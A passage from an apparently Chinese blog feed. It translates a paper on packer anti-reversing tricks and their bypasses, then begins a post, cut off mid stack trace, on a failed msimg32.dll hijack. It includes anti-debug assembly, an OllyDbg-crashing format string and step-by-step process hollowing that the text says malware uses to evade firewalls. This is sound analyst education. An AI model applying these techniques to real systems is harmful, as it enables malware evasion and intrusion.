[eax+0x18],0&#10;;set Context.EIP upon return&#10;add     dword [eax+0xb8],6&#10;xor     eax,eax&#10;retn</span><br></pre></td></tr></table></figure><br><br>另一方面，对于软件断点，壳可以只搜索INT3（0xCC）指令，然后使用任意操作码替换；这样操作之后软件断点会失效并且原始的指令也会被破坏。<br><em>解决方案</em><br>显然，如果硬件断点会被检测到，可以使用软件断点替代，反之亦然。如果这两种断点都会被检测到，可以尝试使用ollydbg的内存访问/写断点替代。<br><br>### 5.5 未处理异常过滤<br>MSDN文档指出如果一个异常到达未处理异常过滤器（kernel32!UnhandledExceptionFilter）且该进程没有被调试，未处理异常过滤器将会调用顶层异常处理函数，该函数是函数通过kernel32!SetUnhandledExceptionFilter()被设置为顶层异常处理函数，是kernel32!SetUnhandledExceptionFilter()的参数。壳可以设置一个异常处理函数然后抛出一个异常，如果进程正在被调试调试器会作为第二优先级接受到这个异常，否则代码控制权将传递给异常过滤函数并继续执行。<br><em>例子</em><br>下面是一个使用SetUnhandledExceptionFilter（）设置顶层异常过滤器使用的示例，然后会抛出一个访问异常。如果进程正在被调试，调试器将会作为第二优先级接收到这个一场，否则异常将会设置CONTEXT.EIP然后继续执行。<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;set the exception filter&#10;push    .exception_filter&#10;call    [SetUnhandledExceptionFilter]&#10;mov     [.original_filter],eax&#10;&#10;;throw an exception&#10;xor     eax,eax&#10;mov     dword [eax],0&#10;;restore exception filter&#10;push    dword [.original_filter]&#10;call    [SetUnhandledExceptionFilter]&#10;:::&#10;.exception_filter:&#10;;EAX = ExceptionInfo.ContextRecord&#10;mov     eax,[esp+4]&#10;mov     eax,[eax+4]&#10;;set return EIP upon return&#10;add     dword [eax+0xb8],6&#10;;return EXCEPTION_CONTINUE_EXECUTION&#10;mov     eax,0xffffffff&#10;retn</span><br></pre></td></tr></table></figure><br><br>一些壳也可能直接手动使用kernel32!_BasepCurrentTopLevelFilter设置异常过滤取代SetUnhandledExceptionFilter()，利用这种方式防止逆向者使用API断点。<br><em>解决方案</em><br>有趣的是，在kernel32!UnhandledExceptionFilter()函数内部使用ntdll!NtQueryInformationProcess (ProcessDebugPort)去判断当前进程是否正在被调试，然后决定是否调用注册的一场过滤器。因此这里的解决方案和DebugPort的检测方案相同。<br><br>### 5.6 Ollydbg:OutputDebugString()字符格式Bug<br>这里的调试器攻击只针对Ollydbg。Ollydbg已知的一个格式化字符串漏洞，会造成调试器崩溃或者执行任意代码，这个bug可以通过一个不正确的字符串参数传递给kernel32!OutputDebugString()而触发，这个bug仍然存在当前版本的OllyDbg（1.10）并且仍然没有被修复。<br><em>例子</em><br>这个简单的例子会导致OllyDbg抛出一个访问异常或则意外终止：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">push    .szFormatString&#10;call    [OutputDebugStringA]&#10;:::&#10;.szFormatString db &#34;%s%s&#34;,0</span><br></pre></td></tr></table></figure><br><br><em>解决方案</em><br>解决方案是直接Patch kernel32!OutputDebugStringA()函数头部，让函数仅仅执行一个RETN。<br><br>## 6. ADVANCED 和其他技术<br>本小结将列举一些高级的以及一些其他未在之前反逆向小结提及的技术。<br><br>### 6.1 进程注入<br><div align="center"><br><img src="/img/2018_0523_06_01_1.png" alt align="center"><br></div><br>进程注入已经成为一些壳的功能，有了这个功能，壳的脱壳stub会选择特定的宿主进程（如自己进程/explorer.exe/iexplorer.exe等），然后将脱壳后的可执行程序注入到宿主进程中。<br><div align="center"><br><img src="/img/2018_0523_06_01_2.png" alt align="center"><br></div><br>上面是一个支持进程注入功能的壳的屏幕截图。<br>恶意代码利用壳的这种特性绕过允许白名单进程联网的防火墙。<br>壳执行进程注入的一种方法如下所示：<br><br>- 1.创建一个宿主作为一个挂起的子进程。使用CREATE_SUSPENDED标志kernel32!CreateProcess()创建进程。这样创建的初始线程将会被创建并被挂起，DLLs这会还没有开始加载，因为加载函数（ntdll!LrdInitializeThunk）还没有被调用。初始线程的的线程上下文被设置，如寄存器信息、PEB地址、宿主进程的入口点。<br>- 2.调用kernel32!GetThreadContext()，获取子进程的的Context。<br>- 3.通过CONTEXT.EBX获取获取子进程的PEB地址。<br>- 4.通过PEB.ImageBase(PEB+0x8)获得子进程的映像基地址。<br>- 5.使用ntdll!NtUnmapViewOfSection()参数为指向子进程映像基地址的指针卸载子进程的内存空间数据。<br>- 6.脱壳stub使用kernel32！VirtualAllocEx()在紫禁城中分配内存空间，dwsize参数等于脱壳后的可执行文件大小。<br>- 7.使用kernel32！WriteProcessMemory()将脱壳后的可执行文件PE头及每个节写入到子进程内存空间。<br>- 8.更新子进程的PEB.ImageBase匹配脱壳后的可执行文件的基地址。<br>- 9.使用kernel32!SetThreadContext()修改子进程的初始线程的CONTEXT.EAX为脱壳后的可执行文件的入口地址。<br>- 10.使用kernel32!ResumeThread()恢复子进程运行。<br><br>为了调试被寄生的子进程的入口点，逆向者可以在被脱壳可执行文件包含入口节被写入到子进程的时候在函数WriteProcessMemory()中设置一个断点，然后将patch脱壳可执行文件的入口点为一个死循环（0xEB 0xFE）。当子进程的初始线程被恢复执行的时候，子进程将会在入口点进入一个死循环，然后逆向者可以使用调试器挂上子进程，恢复入口点的代码，并继续调试。<br><br>### 6.2 拦截调试器（Debugger Blocker）<br>Armadillo壳引入了一种被称为Debugger Blocker的特性。这种特性可以防止逆向者使用调试器attach被保护的进程。这种保护功能是通过windows提供的调试功能实现的。<br><div align="center"><br><img src="/img/2018_0523_06_02_1.png" alt align="center"><br></div><br>具体来说就是，壳的脱壳stub会充当一个调试器（父进程），执行调试/控制包含脱壳后可执行文件的子进程。<br>因为被保护的进程已经正在被调试了，当调试器使用kernel32!DebugActiveProcess()挂接时会失败因为native API ntdll!NtDebugActiveProcess()会返回STATUS_PORT_ALREADY_SET错误码。在函数NtDebugActiveProcess()内部失败的原因是该进程的EPROCESS的DebugPort已经被设置。<br>为了去挂上被保护的进程进行调试，在几个逆向论坛中发布了一种解决方案，可以在父进程的进程上下文中调用kernel32!DebugActiveProcessStop()。可以使用调试器挂上父进程调试，然后在函数kernel32!WaitForDebugEvent()上设置断点，一旦断点命中，就使用代码注入执行DebugActiveProcessStop(ChildProcessPID)。执行成功后就可以使用调试器调试被保护的进程。<br><br>### 6.3 TLS回调<br>壳使用的另一种技术是在实际入口点代码执行之前执行代码。通过线程本地回调实现（Thread Local Storage,TLS）。壳可能会通过TLS实现调试器检测和代码解密，这样逆向者就不能调试这些函数。<br>TLS可以通过PE解析工具识别，如pedump。如果可执行文件存在TLS目录，使用pedump将可以在PE文件的Data Directory entries看到。<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Data Directory&#10;EXPORT rva: 00000000 size: 00000000&#10;IMPORT rva: 00061000 size: 000000E0&#10;:::&#10;TLS rva: 000610E0 size: 00000018                       //&#10;:::&#10;IAT rva: 00000000 size: 00000000&#10;DELAY_IMPORT rva: 00000000 size: 00000000&#10;COM_DESCRPTR rva: 00000000 size: 00000000&#10;unused rva: 00000000 size: 00000000</span><br></pre></td></tr></table></figure><br><br>然后可以看到TLS目录实际的内容，AddressOfCallBacks字段会指向一个以null为结束符的回调函数数组。<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TLS directory:&#10;StartAddressOfRawData: 00000000&#10;EndAddressOfRawData: 00000000&#10;AddressOfIndex: 004610F8&#10;AddressOfCallBacks: 004610FC      //&#10;SizeOfZeroFill: 00000000&#10;Characteristics: 00000000</span><br></pre></td></tr></table></figure><br><br>在本例中，相对虚拟地址RVA 0x4610fc指向回掉函数指针（0x490f43和0x44654e）。<br><div align="center"><br><img src="/img/2018_0523_06_03_1.png" alt align="center"><br></div><br>默认情况下，Ollydbg加载样本文件后会停在入口点。因为TLS回调试在入口点调用之前执行，OllyDbg应该重新配置以便能够停在TLS回调执行之前。<br>可以通过Options -&gt; Debugging Options -&gt; Events -&gt; Make first pause at -&gt; System breakpoint设置以便能够断在ntdll.dll中。<br><div align="center"><br><img src="/img/2018_0523_06_03_2.png" alt align="center"><br></div><br>设置后，OllyDbg会断在函数ntdll!  _LdrpInitializeProcess()中，该函数在ntdll!_LdrpRunInitializeRoutines()函数执行TLS回调之前。这样就可以在TLS回调函数中设置断点并调试。<br>更多关于PE文件格式的信息，包括pedump的二进制文件和源代码可以在下面的链接中找到:An In-Depth Look into the Win32 Portable Executable File Format by Matt Pietrek(<a href="http://msdn.microsoft.com/msdnmag/issues/02/02/PE/default.aspx)、An" target="_blank" rel="external">http://msdn.microsoft.com/msdnmag/issues/02/02/PE/default.aspx)、An</a> In-Depth Look into the Win32 Portable Executable File Format, Part 2 by Matt Pietrek(<a href="https://msdn.microsoft.com/msdnmag/issues/02/03/PE2/" target="_blank" rel="external">https://msdn.microsoft.com/msdnmag/issues/02/03/PE2/</a>)<br>最新版本的PE文件格式信息:Microsoft Portable Executable and Common Object File Format Specification(<a href="http://www.microsoft.com/whdc/system/platform/firmware/PECOFF.mspx" target="_blank" rel="external">http://www.microsoft.com/whdc/system/platform/firmware/PECOFF.mspx</a>)<br><br>### 6.4 偷字节<br>壳偷的字节基本都是被保护可执行文件代码的一部分（通常是入口点的少量代码），壳会删除这部分代码并在分配的内存中执行这部分代码。这是一种保护可执行文件的一种方式，如果被保护的代码从内存中被dump出来，被偷的那部分指令将无法恢复。<br>下面是一个可执行文件原始的入口点代码：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">004011CB MOV    EAX,DWORD PTR FS:[0]&#10;004011D1 PUSH   EBP&#10;004011D2 MOV    EBP,ESP&#10;004011D4 PUSH   -1&#10;004011D6 PUSH   0047401C&#10;004011DB PUSH   0040109A&#10;004011E0 PUSH   EAX&#10;004011E1 MOV    DWORD PTR FS:[0],ESP&#10;004011E8 SUB    ESP,10&#10;004011EB PUSH   EBX&#10;004011EC PUSH   ESI&#10;004011ED PUSH   EDI</span><br></pre></td></tr></table></figure><br><br>接下来是同一个样本但是前两行指令被Enigma保护壳偷了的代码：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">004011CB POP    EBX       //&#10;004011CC CMP    EBX,EBX   //&#10;004011CE DEC    ESP       //&#10;004011CF POP    ES        //&#10;004011D0 JECXZ  SHORT 00401169&#10;004011D2 MOV    EBP,ESP&#10;004011D4 PUSH   -1&#10;004011D6 PUSH   0047401C&#10;004011DB PUSH   0040109A&#10;004011E0 PUSH   EAX&#10;004011E1 MOV    DWORD PTR FS:[0],ESP&#10;004011E8 SUB    ESP,10&#10;004011EB PUSH   EBX&#10;004011EC PUSH   ESI&#10;004011ED PUSH   EDI</span><br></pre></td></tr></table></figure><br><br>下面是同一个样本被ASProtect保护壳偷了几个指令的代码，它在被偷字节的函数前添加了跳转指令，然后将偷来的字节和垃圾代码混合在一起，很难恢复被盗的指令。<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">004011CB JMP    00B70361         //&#10;004011D0 JNO    SHORT 00401198&#10;004011D3 INC    EBX&#10;004011D4 ADC    AL,0B3&#10;004011D6 JL     SHORT 00401196&#10;004011D8 INT1&#10;004011D9 LAHF&#10;004011DA PUSHFD&#10;004011DB MOV    EBX,1D0F0294&#10;004011E0 PUSH   ES&#10;004011E1 MOV    EBX,A732F973&#10;004011E6 ADC    BYTE PTR DS:[EDX-E],CH&#10;004011E9 MOV    ECX,EBP&#10;004011EB DAS&#10;004011EC DAA&#10;004011ED AND    DWORD PTR DS:[EBX+58BA76D7],ECX</span><br></pre></td></tr></table></figure><br><br>### 6.5 API重定向<br>API重定向是一种防止逆向者轻松重建被保护可执行文件导入表的方法。通常情况下，原始的导入表将会被销毁，调用API将会被重定向到一片被分配的内存的函数中，这些函数负责调用这些API。<br>下面的例子展示了调用kernel32!CopyFileA()这个API的代码：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00404F05 LEA    EDI,DWORD PTR SS:[EBP-20C]&#10;00404F0B PUSH   EDI&#10;00404F0C PUSH   DWORD PTR SS:[EBP-210]&#10;00404F12 CALL   &#60;JMP.&#38;KERNEL32.CopyFileA</span><br></pre></td></tr></table></figure><br><br>这种调用方式是一个执行JMP的stub，跳转地址是从导入表引用的：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">004056B8 JMP DWORD PTR DS:[&#60;&#38;KERNEL32.CopyFileA&#62;]</span><br></pre></td></tr></table></figure><br><br>然而当ASProtect重定向kernel32!CopyFileA()这个API时，这个stub被替换成CALL一个函数，这个函数地址位于一片被分配出来的内存并最终会执行偷来的指令调用kernel32!CopyFileA():<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">004056B8   CALL     00D90000</span><br></pre></td></tr></table></figure><br><br>下面是一个如何放置偷来的指令的说明。kernel32!CopyFileA()函数的前7条指令已经被复制。另外，在地址0x7c83005e处指向的call指令也被复制。然后通过RETN指令控制权被转到0x7c830063，该地址位于kernel32!CopyFileA()函数中。<br><div align="center"><br><img src="/img/2018_0523_06_05_1.png" alt align="center"><br></div><br>一些壳还会还会尽可能将整个DLL映像文件映射到内存，然后将API调用重定向到这个DLL副本中。这种技术使在实际API下断点变得很困难。<br><br>### 6.6. 多线程壳<br>使用多线程壳时候，通常会启另一个线程执行一些重要的操作如解密被保护的数据。使用多线程壳会增加复杂性和理解代码的难度，因为调试跟踪壳代码将会比较复杂。<br>多线程壳的一个例子是PECrypt，它使用第二个线程来解密主线程获取的数据，这些线程通过事件对象进行同步。<br>PECrypt执行和线程同步如下所示：<br><div align="center"><br><img src="/img/2018_0523_06_06_1.png" alt align="center"><br></div>


<h3 id="6-7-_虚拟机">6.7. 虚拟机</h3><p>使用虚拟机的原因很简单：逆向者最终会弄清楚如何绕过/解决反调试和反分析技术，最终被保护的代码也会在内存中解密，这样就很容易静态分析。<br>随着虚拟机的出现，代码被保护的部分被转换为p-code，然后会转换为机器码执行。因此，原始的机器码被替换，被替换后的代码的理解难度也呈指数型增长。<br>下面是这个概念的一个相当简单的例子：</p>
<p><div align="center"><br><img src="/img/2018_0523_06_07_1.png" alt align="center"><br></div><br>Oreans公司的CodeVirtualizer和StarForce等现代壳使用虚拟机这一概念来保护可执行文件。<br>虚拟机的解决方案显然不简单，要去分析p-code的结构及p-code如何被虚拟机翻译。并且通过获得的信息，设计反汇编程序解析p-code并将其翻译成机器码或则开发出可以理解的说明。<br>可以从下面的链接中找到一个开发p-code反汇编程序及关于虚拟机如何实现的例子：Defeating HyperUnpackMe2 With an IDA Processor Module, Rolf Rolles III<br><a href="http://www.openrce.org/articles/full_view/28" target="_blank" rel="external">http://www.openrce.org/articles/full_view/28</a></p>
<h2 id="7-_工具">7. 工具</h2><p>本节将列举逆向工程师和恶意代码分析师用于分析壳和脱壳公开的可用工具。<br>免责声明：这些工具是第三方工具，本文作者不承担任何责任。工具可能会导致系统不稳定或其他可能影响系统的问题。永远建议在测试环境或则病毒分析环境测试这些工具。<a href="http://www.ollydbg.de/" target="_blank" rel="external">http://www.ollydbg.de/</a></p>
<h3 id="7-1-_OllyDbg">7.1. OllyDbg</h3><p>一个强大的ring3层调试器，经常被逆向工程师和恶意代码分析师使用。它的插件功能允许其他逆向工程师开发插件使逆向和脱壳更加容易。</p>
<h3 id="7-2-_Ollyscript">7.2. Ollyscript</h3><p>Ollydbg插件，允许自动设置和处理断点、patch代码和数据等功能。使用的脚本语言和汇编相似，在执行重复任务和脱壳时最有用。<a href="http://www.openrce.org/downloads/details/106/OllyScript" target="_blank" rel="external">http://www.openrce.org/downloads/details/106/OllyScript</a></p>
<h3 id="7-3_Olly_Advanced">7.3 Olly Advanced</h3><p>如果壳包含反逆向的代码，这个插件是一个逆向调试很有用的插件。它有几个选项可以绕过反调试技术和隐藏ollydbg不被壳检测到等。<a href="http://www.openrce.org/downloads/details/241/Olly_Advanced" target="_blank" rel="external">http://www.openrce.org/downloads/details/241/Olly_Advanced</a></p>
<h3 id="7-4-_OllyDump">7.4. OllyDump</h3><p>成功脱壳后这个插件可用于dump和重建导入表。<a href="http://www.openrce.org/downloads/details/108/OllyDump" target="_blank" rel="external">http://www.openrce.org/downloads/details/108/OllyDump</a></p>
<h3 id="7-5-_ImpRec">7.5. ImpRec</h3><p>最后是另一个dump和重建导入表的工具。这是一个独立的工具，它提供了最强大的导入表重建功能。<a href="http://www.woodmann.com/crackz/Unpackers/Imprec16.zip" target="_blank" rel="external">http://www.woodmann.com/crackz/Unpackers/Imprec16.zip</a></p>
<h2 id="8-_参考">8. 参考</h2><p><strong>Books: Reverse Engineering, Software Protection</strong></p>
<ul>
<li>Reversing: Secrets of Reverse Engineering. E.Eilam. Wiley, 2005.</li>
<li>Crackproof Your Software, P.Cerven.No Starch Press, 2002.</li>
</ul>
<p><strong>Books: Windows and Processor Internals</strong></p>
<ul>
<li>Microsoft Windows Internal, 4 th Edition. M. Russinovich, D. Solomon, Microsoft Press,<br>2005</li>
<li>IA-32 Intel® Architecture Software Developer’s Manual. Volume 1-3, Intel Corporation,<br>2006.<a href="http://www.intel.com/products/processor/manuals/index.htm" target="_blank" rel="external">http://www.intel.com/products/processor/manuals/index.htm</a></li>
</ul>
<p><strong>Links: Windows Internals</strong></p>
<ul>
<li>ReactOS Project <a href="http://www.reactos.org/en/index.html" target="_blank" rel="external">http://www.reactos.org/en/index.html</a></li>
<li>Source Search: <a href="http://www.reactos.org/generated/doxygen/" target="_blank" rel="external">http://www.reactos.org/generated/doxygen/</a></li>
<li>Wine Project <a href="http://www.winehq.org/" target="_blank" rel="external">http://www.winehq.org/</a></li>
<li><p>Source Search: <a href="http://source.winehq.org/source/" target="_blank" rel="external">http://source.winehq.org/source/</a></p>
</li>
<li><p>The Undocumented Functions <a href="http://undocumented.ntinternals.net" target="_blank" rel="external">http://undocumented.ntinternals.net</a></p>
</li>
<li>MSDN <a href="http://msdn2.microsoft.com/en-us/default.aspx" target="_blank" rel="external">http://msdn2.microsoft.com/en-us/default.aspx</a></li>
</ul>
<p><strong>Links: Reverse Engineering, Software Protection, Unpacking</strong></p>
<ul>
<li>OpenRCE <a href="http://www.openrce.org" target="_blank" rel="external">http://www.openrce.org</a></li>
<li>OpenRCE Anti Reverse Engineering Techniques Database <a href="http://www.openrce.org/reference_library/anti_reversing" target="_blank" rel="external">http://www.openrce.org/reference_library/anti_reversing</a></li>
<li>RCE Forums <a href="http://www.woodmann.com/forum/index.php" target="_blank" rel="external">http://www.woodmann.com/forum/index.php</a></li>
<li>EXETOOLS Forums <a href="http://forum.exetools.com" target="_blank" rel="external">http://forum.exetools.com</a></li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="摘要">摘要</h2><p>脱壳是一门艺术，同时也是一种智力挑战，在逆向领域脱壳是最令人头脑兴奋的智力游戏之一。在某些情况下，逆向工作者需要对操作系统内部原理非常熟悉，这样才能识别和绕过壳开发人员的反逆向分析技术，耐心和聪明是成功脱壳的两个主要条件。这些挑战包括壳开发人员开发壳，同时在另一方面也包括逆向工作研究者如何绕过壳的这些保护。<br>这篇文章主要介绍了壳开发人员使用的一些反逆向工程技术，同时也讨论如何绕过和关闭这些保护的技术和一些公开的工具。当遇到被壳保护的恶意代码的时候，这些信息能让逆向工作研究人员尤其是恶意代码分析人员更加容易的去识别这些技术，然后绕过这些反逆向分析技术去进行下一步的分析工作。这篇文章的第二个目的是让一些开发人员能够去使用这些技术在一定程度上减缓被逆向分析的可能，给代码增加更多的保护。当然，遇到逆向分析高手的时候，什么方法都没辙。<br><strong>关键词</strong>：逆向工程，壳，保护，反调试，反逆向分析</p>]]>
    
    </summary>
    
      <category term="脱壳" scheme="http://www.youngroe.com/tags/%E8%84%B1%E5%A3%B3/"/>
    
      <category term="Learning" scheme="http://www.youngroe.com/categories/Learning/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[msimg32.dll劫持失败原因分析]]></title>
    <link href="http://www.youngroe.com/2016/10/02/Debug/the-reasons-of-Dll-hijiacking-msimg32-fail/"/>
    <id>http://www.youngroe.com/2016/10/02/Debug/the-reasons-of-Dll-hijiacking-msimg32-fail/</id>
    <published>2016-10-02T07:27:11.000Z</published>
    <updated>2020-02-15T07:54:24.203Z</updated>
    <content type="html"><![CDATA[<h2 id="问题描述">问题描述</h2><p>前一段事件做一个题的时候，需要修改主程序执行逻辑，当时想想应该很简单，直接做dll劫持然后在该DllMain中去修改主程序Exe的执行逻辑（因为之前看到飘云阁的 Visual Assist X劫持用的msimg32）。很顺利的在调试系统(win xp)做完了，达到了预期目的。但是拿到win7和win10上运行顿时就不行了。<br>主要问题有两个：</p>
<ul>
<li>win7上直接不加载劫持dll,msimg32.dll了</li>
<li>win10上会加载msimg32.dll，但是加载时间靠后，在主程序逻辑执行后才被加载，这会修改逻辑也没用了</li>
</ul>
<p>当时时间紧急，也比较慌。没有分析，改了方案直接修改主程序二进制，文件补丁方式做的<br><a id="more"></a></p>
<h2 id="问题分析调试">问题分析调试</h2><h3 id="问题1">问题1</h3><div align="center"><br><img src="/img/20161002msimg32_depnds.png" alt="主程序dll依赖情况" align="center"><br></div><br>首先depends看下主程序dll依赖情况，发现确实有msimg32.dll啊。怎么会出现win7不加载呢？好像前面有个沙漏，F1查看depends帮助发现这个沙漏标志msimg32.dll是延迟加载dll（延迟加载的dll是在该dll中的函数被调用的时候才被加载，延迟加载提高的程序的启动速度）。那为什么winxp会加载呢？<br><div align="center"><br><img src="/img/20161002msimg32_procmon.png" alt="winxp加载msimg32.dll堆栈情况" align="center"><br></div><br>上神器procmon,发现是在imm32.dll中加载了msimg32.dll，搜索imm32.dll发现是和输入法相关。对比两个系统发现winxp调试系统安装了qq拼音输入法而win7上没有，应该qq拼音的原因。将xp的qq输入法卸载，果然xp系统也不加载了。但是具体什么原因还不知道，直接上调试器，但开始不知道怎么下断点，就直接将msimg32.dll的入口点修改二进制为0xcc,直接断下(其实可以直接对bu ntdll!LdrLoadDll “dU /c 50 poi(@ebp+8)”<br>,开始下的LoadLibaryExW以为加载dll都会通过这个函数),堆栈情况如下<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">ChildEBP RetAddr  Args to Child              </span><br><span class="line">WARNING: Stack unwind information not available. Following frames may be wrong.</span><br><span class="line"><span class="number">0012e3</span>cc <span class="number">7</span>c93c4da <span class="number">762f</span>110c <span class="number">762f</span>0000 <span class="number">00000001</span> MSIMG32!DllInitialize</span><br><span class="line"><span class="number">0012e4</span>d4 <span class="number">7</span>c936351 <span class="number">00000000</span> c0150008 <span class="number">00000000</span> ntdll!LdrFindResourceDirectory_U+<span class="number">0x28d</span></span><br><span class="line"><span class="number">0012e780</span> <span class="number">7</span>c9364b3 <span class="number">00000000</span> <span class="number">00148818</span> <span class="number">0012</span>ea74 ntdll!RtlValidateUnicodeString+<span class="number">0x507</span></span><br><span class="line"><span class="number">0012</span>ea28 <span class="number">7</span>c801bbd <span class="number">00148818</span> <span class="number">0012</span>ea74 <span class="number">0012</span>ea54 ntdll!LdrLoadDll+<span class="number">0x110</span></span><br><span class="line"><span class="number">0012</span>ea90 <span class="number">7</span>c80aeec <span class="number">0012</span>eac4 <span class="number">00000000</span> <span class="number">00000000</span> kernel32!LoadLibraryExW+<span class="number">0xc8</span></span><br><span class="line">*** ERROR: Symbol file could not be found.  Defaulted to <span class="keyword">export</span> symbols <span class="keyword">for</span> C:\WINDOWS\system32\IMM32.DLL - </span><br><span class="line"><span class="number">0012</span>eaa4 <span class="number">763071f</span>4 <span class="number">0012</span>eac4 <span class="number">00000000</span> <span class="number">00147790</span> kernel32!LoadLibraryW+<span class="number">0x11</span></span><br><span class="line"><span class="number">0012</span>ecd0 <span class="number">76307680</span> <span class="number">0012</span>ed08 <span class="number">00147790</span> <span class="number">001464e0</span> IMM32!ImmNotifyIME+<span class="number">0x21c</span></span><br><span class="line"><span class="number">0012</span>ee64 <span class="number">763077</span>bb e0200804 <span class="number">00000000</span> <span class="number">0012</span>ee84 IMM32!ImmNotifyIME+<span class="number">0x6a8</span></span><br><span class="line"><span class="number">0012</span>ee74 <span class="number">77</span>d6b570 e0200804 <span class="number">001464e0</span> <span class="number">0012f</span>0d4 IMM32!ImmLoadIME+<span class="number">0x4c</span></span><br><span class="line"><span class="number">0012</span>ee84 <span class="number">77</span>d6be00 <span class="number">001464e0</span> <span class="number">00647</span>ac8 <span class="number">00000287</span> USER32!IMPSetIMEA+<span class="number">0x6c</span></span><br><span class="line"><span class="number">0012f</span>0d4 <span class="number">77</span>d6c8cf <span class="number">001464e0</span> <span class="number">00000287</span> <span class="number">00000021</span> USER32!IMPSetIMEA+<span class="number">0x8fc</span></span><br><span class="line"><span class="number">0012f</span>0f8 <span class="number">77</span>d6c952 <span class="number">00010</span>b7c <span class="number">00000287</span> <span class="number">00000021</span> USER32!IMPSetIMEA+<span class="number">0x13cb</span></span><br><span class="line"><span class="number">0012f</span>114 <span class="number">77</span>d18734 <span class="number">00010</span>b7c <span class="number">00000287</span> <span class="number">00000021</span> USER32!IMPSetIMEA+<span class="number">0x144e</span></span><br><span class="line"><span class="number">0012f</span>140 <span class="number">77</span>d18816 <span class="number">77</span>d6c930 <span class="number">00010</span>b7c <span class="number">00000287</span> USER32!GetDC+<span class="number">0x6d</span></span><br><span class="line"><span class="number">0012f</span>1a8 <span class="number">77</span>d2a013 <span class="number">00000000</span> <span class="number">77</span>d6c930 <span class="number">00010</span>b7c USER32!GetDC+<span class="number">0x14f</span></span><br><span class="line"><span class="number">0012f</span>1d8 <span class="number">77</span>d2a998 <span class="number">77</span>d6c930 <span class="number">00010</span>b7c <span class="number">00000287</span> USER32!IsWindowUnicode+<span class="number">0xa1</span></span><br><span class="line">*** WARNING: Unable to verify checksum <span class="keyword">for</span> image00400000</span><br><span class="line">*** ERROR: Module load completed but symbols could not be loaded <span class="keyword">for</span> image00400000</span><br><span class="line"><span class="number">0012f</span>1f8 <span class="number">0040</span>d08f <span class="number">77</span>d6c930 <span class="number">00010</span>b7c <span class="number">00000287</span> USER32!CallWindowProcA+<span class="number">0x1b</span></span><br><span class="line"><span class="number">0012f</span>26c <span class="number">77</span>d18734 <span class="number">00010</span>b7c <span class="number">00000287</span> <span class="number">00000021</span> image00400000+<span class="number">0xd08f</span></span><br><span class="line"><span class="number">0012f</span>298 <span class="number">77</span>d18816 <span class="number">0040</span>cf74 <span class="number">00010</span>b7c <span class="number">00000287</span> USER32!GetDC+<span class="number">0x6d</span></span><br><span class="line"><span class="number">0012f</span>300 <span class="number">77</span>d28ea0 <span class="number">00000000</span> <span class="number">0040</span>cf74 <span class="number">00010</span>b7c USER32!GetDC+<span class="number">0x14f</span></span><br><span class="line"><span class="number">0012f</span>354 <span class="number">77</span>d28eec <span class="number">00647</span>ac8 <span class="number">00000287</span> <span class="number">00000021</span> USER32!DefWindowProcW+<span class="number">0x180</span></span><br><span class="line"><span class="number">0012f</span>37c <span class="number">7</span>c92e453 <span class="number">0012f</span>38c <span class="number">00000018</span> <span class="number">00647</span>ac8 USER32!DefWindowProcW+<span class="number">0x1cc</span></span><br><span class="line"><span class="number">0012f</span>844 <span class="number">77</span>d26423 <span class="number">80050101</span> <span class="number">00008002</span> <span class="number">0012f</span>8a8 ntdll!KiUserCallbackDispatcher+<span class="number">0x13</span></span><br><span class="line"><span class="number">0012f</span>91c <span class="number">77</span>d2683e <span class="number">00400000</span> <span class="number">00008002</span> <span class="number">00000110</span> USER32!IsDlgButtonChecked+<span class="number">0x1629</span></span><br><span class="line"><span class="number">0012f</span>940 <span class="number">77</span>d39b43 <span class="number">00400000</span> <span class="number">00420988</span> <span class="number">00000000</span> USER32!CreateDialogIndirectParamAorW+<span class="number">0x33</span></span><br><span class="line"><span class="number">0012f</span>960 <span class="number">0040</span>c465 <span class="number">00400000</span> <span class="number">00420988</span> <span class="number">00000000</span> USER32!CreateDialogIndirectParamA+<span class="number">0x1b</span></span><br><span class="line"><span class="number">0012f</span>9c8 <span class="number">0040</span>c68e <span class="number">00420988</span> <span class="number">00000000</span> <span class="number">00400000</span> image00400000+<span class="number">0xc465</span></span><br><span class="line"><span class="number">0012f</span>a0c <span class="number">004010e4</span> <span class="number">0041</span>c5d0 ffffffff <span class="number">00414518</span> image00400000+<span class="number">0xc68e</span></span><br><span class="line"><span class="number">0012f</span>fc0 <span class="number">7</span>c817067 <span class="number">00</span>bcf6ee <span class="number">00</span>bcf774 <span class="number">7f</span>fd9000 image00400000+<span class="number">0x10e4</span></span><br><span class="line"><span 